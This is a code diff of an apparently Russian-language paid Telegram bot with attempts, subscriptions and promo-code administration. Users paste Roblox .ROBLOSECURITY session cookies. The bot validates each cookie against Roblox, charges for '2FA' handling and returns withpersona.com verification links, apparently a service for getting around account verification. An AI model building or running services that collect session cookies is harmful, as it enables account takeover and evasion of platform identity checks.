             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("👥 Список пользователей", callback_data="admin_users")],
                 [InlineKeyboardButton("🎫 Список промокодов", callback_data="admin_promo_list")],
-                [InlineKeyboardButton("➕ Добавить попытки", callback_data="admin_add_bal"), InlineKeyboardButton("➖ Отнять попытки", callback_data="admin_rem_bal")],
+                [InlineKeyboardButton("➕ Добавить попытки", callback_data="admin_add_bal"),
+                 InlineKeyboardButton("➖ Отнять попытки", callback_data="admin_rem_bal")],
                 [InlineKeyboardButton("🎟️ Выдать подписку", callback_data="admin_add_sub")],
                 [InlineKeyboardButton("➕ Создать промокод", callback_data="admin_create_promo")],
                 [InlineKeyboardButton("🏠 На главную", callback_data="main_menu")],
@@ -684,10 +795,11 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if user_id not in ADMIN_IDS:
             return WAITING_MENU
         rows = db_get_all_users()
-        lines = ["*👥 Список пользователей (все):*\n"]
+        lines = ["*👥 Список пользователей:*\n"]
         for uid, uname, atts, spent in rows[:30]:
             lines.append(f"ID: `{uid}` | @{uname or '---'} | Поп: {atts} | ${round(spent, 2)}")
-        await query.edit_message_text("\n".join(lines), parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ В админку", callback_data="admin")]]))
+        await query.edit_message_text("\n".join(lines), parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ В админку", callback_data="admin")]]))
         return WAITING_ADMIN
 
     if data == "admin_promo_list":
@@ -696,36 +808,42 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         rows = db_get_all_promos()
         lines = ["*🎫 Список промокодов:*\n"]
         for code, atts, uses, max_uses in rows:
-            lines.append(f"`{code}` — {atts} поп. | Использовано: {uses}/{max_uses}")
-        await query.edit_message_text("\n".join(lines) if rows else "Промокодов нет.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ В админку", callback_data="admin")]]))
+            lines.append(f"`{code}` — {atts} поп. | {uses}/{max_uses}")
+        await query.edit_message_text("\n".join(lines) if rows else "Промокодов нет.", parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ В админку", callback_data="admin")]]))
         return WAITING_ADMIN
 
     if data == "admin_add_bal":
         if user_id not in ADMIN_IDS:
             return WAITING_MENU
         context.user_data["waiting"] = "admin_add_bal_id"
-        await query.edit_message_text("➕ *Добавить попытки*\n\nВведите Telegram ID пользователя:", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
+        await query.edit_message_text("➕ *Добавить попытки*\n\nВведите Telegram ID:", parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
         return WAITING_ADMIN_ADD_BALANCE
 
     if data == "admin_rem_bal":
         if user_id not in ADMIN_IDS:
             return WAITING_MENU
         context.user_data["waiting"] = "admin_rem_bal_id"
-        await query.edit_message_text("➖ *Отнять попытки*\n\nВведите Telegram ID пользователя:", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
+        await query.edit_message_text("➖ *Отнять попытки*\n\nВведите Telegram ID:", parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
         return WAITING_ADMIN_REMOVE_BALANCE
 
     if data == "admin_add_sub":
         if user_id not in ADMIN_IDS:
             return WAITING_MENU
         context.user_data["waiting"] = "admin_add_sub_id"
-        await query.edit_message_text("🎟️ *Выдать подписку*\n\nВведите Telegram ID пользователя:", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
+        await query.edit_message_text("🎟️ *Выдать подписку*\n\nВведите Telegram ID:", parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
         return WAITING_ADMIN_ADD_SUB
 
     if data == "admin_create_promo":
         if user_id not in ADMIN_IDS:
             return WAITING_MENU
         context.user_data["waiting"] = "admin_create_promo_text"
-        await query.edit_message_text("🎟️ *Создание промокода*\n\nВведите в формате: `КОД ПОПЫТКИ ЛИМИТ`\nПример: `VIP 10 5`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
+        await query.edit_message_text("🎟️ *Создание промокода*\n\nФормат: `КОД ПОПЫТКИ ЛИМИТ`\nПример: `VIP 10 5`",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Отмена", callback_data="admin")]]))
         return WAITING_ADMIN
 
     return WAITING_MENU
@@ -742,9 +860,13 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ok, msg_key, atts = db_use_promo(user_id, text.upper())
         if ok:
             db_upsert_user(user_id, username, attempts_delta=atts)
-            await update.message.reply_text(t(user_id, "promo_ok", attempts=atts, total=db_get_attempts(user_id)), parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
+            await update.message.reply_text(t(user_id, "promo_ok", attempts=atts, total=db_get_attempts(user_id)),
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
         else:
-            await update.message.reply_text(t(user_id, "promo_not_found"), reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
+            key_map = {"not_found": "promo_not_found", "used": "promo_used", "used_by_you": "promo_used_by_you"}
+            await update.message.reply_text(t(user_id, key_map.get(msg_key, "promo_not_found")),
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "btn_back"), callback_data="main_menu")]]))
         return WAITING_MENU
 
     if user_id in ADMIN_IDS:
@@ -752,10 +874,10 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 context.user_data["target_uid"] = int(text)
                 context.user_data["waiting"] = "admin_add_bal_amt"
-                await update.message.reply_text("Введите количество попыток для добавления:")
+                await update.message.reply_text("Введите количество попыток:")
                 return WAITING_ADMIN_ADD_BALANCE_AMOUNT
             except ValueError:
-                await update.message.reply_text("Ошибка! Введите числовой ID.")
+                await update.message.reply_text("Ошибка! Числовой ID.")
                 return WAITING_ADMIN_ADD_BALANCE
 
         elif waiting == "admin_add_bal_amt":
@@ -764,7 +886,8 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 amt = int(text)
                 db_upsert_user(target_uid, "AdminAdded", attempts_delta=amt)
-                await update.message.reply_text(f"✅ Успешно добавлено {amt} попыток пользователю `{target_uid}`!", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
+                await update.message.reply_text(f"✅ +{amt} попыток → `{target_uid}`", parse_mode="Markdown",
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
             except ValueError:
                 await update.message.reply_text("Ошибка! Введите число.")
             return WAITING_ADMIN
@@ -776,7 +899,7 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("Введите количество попыток для списания:")
                 return WAITING_ADMIN_REMOVE_BALANCE_AMOUNT
             except ValueError:
-                await update.message.reply_text("Ошибка! Введите числовой ID.")
+                await update.message.reply_text("Ошибка! Числовой ID.")
                 return WAITING_ADMIN_REMOVE_BALANCE
 
         elif waiting == "admin_rem_bal_amt":
@@ -787,7 +910,8 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 cur = db_get_attempts(target_uid)
                 to_rem = min(amt, cur)
                 db_upsert_user(target_uid, "AdminRem", attempts_delta=-to_rem)
-                await update.message.reply_text(f"✅ Списано {to_rem} попыток у пользователя `{target_uid}`!", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
+                await update.message.reply_text(f"✅ Списано {to_rem} попыток у `{target_uid}`", parse_mode="Markdown",
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
             except ValueError:
                 await update.message.reply_text("Ошибка! Введите число.")
             return WAITING_ADMIN
@@ -796,10 +920,10 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 context.user_data["target_uid"] = int(text)
                 context.user_data["waiting"] = "admin_add_sub_days"
-                await update.message.reply_text("Введите количество дней подписки (0 — навсегда):")
+                await update.message.reply_text("Введите дней подписки (0 = навсегда):")
                 return WAITING_ADMIN
             except ValueError:
-                await update.message.reply_text("Ошибка! Введите числовой ID.")
+                await update.message.reply_text("Ошибка! Числовой ID.")
                 return WAITING_ADMIN
 
         elif waiting == "admin_add_sub_days":
@@ -808,7 +932,9 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 days = int(text)
                 db_set_subscription(target_uid, days)
-                await update.message.reply_text(f"✅ Подписка выдана пользователю `{target_uid}` на {('навсегда' if days==0 else f'{days} дней')}!", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
+                label = "навсегда" if days == 0 else f"{days} дней"
+                await update.message.reply_text(f"✅ Подписка ({label}) → `{target_uid}`", parse_mode="Markdown",
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
             except ValueError:
                 await update.message.reply_text("Ошибка!")
             return WAITING_ADMIN
@@ -818,9 +944,10 @@ async def receive_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parts = text.split()
             if len(parts) >= 3:
                 db_create_promo(parts[0].upper(), int(parts[1]), int(parts[2]))
-                await update.message.reply_text(f"✅ Промокод `{parts[0].upper()}` на {parts[1]} попыток успешно создан!", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
+                await update.message.reply_text(f"✅ Промокод `{parts[0].upper()}` создан!", parse_mode="Markdown",
+                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("В админку", callback_data="admin")]]))
             else:
-                await update.message.reply_text("Неверный формат! Формат: КОД ПОПЫТКИ ЛИМИТ")
+                await update.message.reply_text("Неверный формат! КОД ПОПЫТКИ ЛИМИТ")
             return WAITING_ADMIN
 
     return await receive_cookie(update, context)
@@ -834,7 +961,7 @@ async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = tg.username or tg.first_name or "Аноним"
 
     if not method:
-        await update.message.reply_text("Сначала выберите метод верификации через /start")
+        await update.message.reply_text("Сначала выберите метод через /start")
         return WAITING_MENU
 
     try:
@@ -846,7 +973,7 @@ async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     s = requests.Session()
     s.cookies[".ROBLOSECURITY"] = cookie
-    r = s.get("https://users.roblox.com/v1/users/authenticated")
+    r = s.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
     if r.status_code != 200:
         await msg.edit_text(t(user_id, "invalid_cookie"))
         return WAITING_MENU
@@ -858,7 +985,7 @@ async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
         is_sub_active, _, _ = db_get_subscription(user_id)
         if not is_sub_active:
             if db_get_attempts(user_id) <= 0:
-                await msg.edit_text("❌ Нет попыток 2FA!")
+                await msg.edit_text("❌ Нет попыток 2FA!" if (db_get_lang(user_id) or "ru") == "ru" else "❌ No 2FA attempts!")
                 return WAITING_MENU
             db_upsert_user(user_id, username, attempts_delta=-1, spent_delta=PRICE_2FA)
 
@@ -877,42 +1004,78 @@ async def receive_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if result and "withpersona.com" in result:
         await msg.edit_text(t(user_id, "link_received"), parse_mode="Markdown")
         await update.message.reply_text(result)
-        _sub_active, _, _ = db_get_subscription(user_id)
-        await send_log(update.get_bot(), user_id, username, method, t(user_id, "log_result_ok"), elapsed, True, has_2fa=has_2fa)
+        await send_log(update.get_bot(), user_id, username, method, elapsed, has_2fa=has_2fa)
         attempts, sub_status = _sub_status_text(user_id)
-        await update.message.reply_text(f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}", parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
+        await update.message.reply_text(
+            f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}",
+            parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
         return WAITING_MENU
 
+    # Возвращаем попытку если 2FA не сработала
     if has_2fa and not db_get_subscription(user_id)[0]:
         db_upsert_user(user_id, username, attempts_delta=1, spent_delta=-PRICE_2FA)
 
     await msg.edit_text(t(user_id, "failed_returned"))
     attempts, sub_status = _sub_status_text(user_id)
-    await update.message.reply_text(f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}", parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
+    await update.message.reply_text(
+        f"{t(user_id, 'main_menu_title')}\n\n{t(user_id, 'main_menu_attempts', attempts=attempts, sub_status=sub_status)}\n\n{t(user_id, 'main_menu_action')}",
+        parse_mode="Markdown", reply_markup=main_menu_kb(user_id))
     return WAITING_MENU
+
+# ─────────────────────────── MAIN ───────────────────────────
 
 def main():
     db_init()
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+
     conv = ConversationHandler(
-        entry_points=[CommandHandler("start", start)],
+        entry_points=[
+            CommandHandler("start", start),
+            CommandHandler("lang", lang_command),
+        ],
         states={
+            WAITING_LANG: [CallbackQueryHandler(handle_callback)],
             WAITING_MENU: [CallbackQueryHandler(handle_callback)],
-            WAITING_COOKIE: [CallbackQueryHandler(handle_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text)],
+            WAITING_COOKIE: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
             WAITING_BUY: [CallbackQueryHandler(handle_callback)],
             WAITING_PAYMENT: [CallbackQueryHandler(handle_callback)],
-            WAITING_PROMO: [CallbackQueryHandler(handle_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text)],
-            WAITING_ADMIN: [CallbackQueryHandler(handle_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text)],
-            WAITING_ADMIN_ADD_BALANCE: [CallbackQueryHandler(handle_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text)],
-            WAITING_ADMIN_ADD_BALANCE_AMOUNT: [CallbackQueryHandler(handle_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text)],
-            WAITING_ADMIN_REMOVE_BALANCE: [CallbackQueryHandler(handle_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text)],
-            WAITING_ADMIN_REMOVE_BALANCE_AMOUNT: [CallbackQueryHandler(handle_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text)],
+            WAITING_PROMO: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
+            WAITING_ADMIN: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
+            WAITING_ADMIN_ADD_BALANCE: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
+            WAITING_ADMIN_ADD_BALANCE_AMOUNT: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
+            WAITING_ADMIN_REMOVE_BALANCE: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
+            WAITING_ADMIN_REMOVE_BALANCE_AMOUNT: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
+            WAITING_ADMIN_ADD_SUB: [
+                CallbackQueryHandler(handle_callback),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
+            ],
         },
-        fallbacks=[CommandHandler("start", start)],
+        fallbacks=[CommandHandler("start", start), CommandHandler("lang", lang_command)],
         per_user=True, per_chat=True, block=False,
     )
-    app.add_handler(conv)
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    application.add_handler(conv)
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
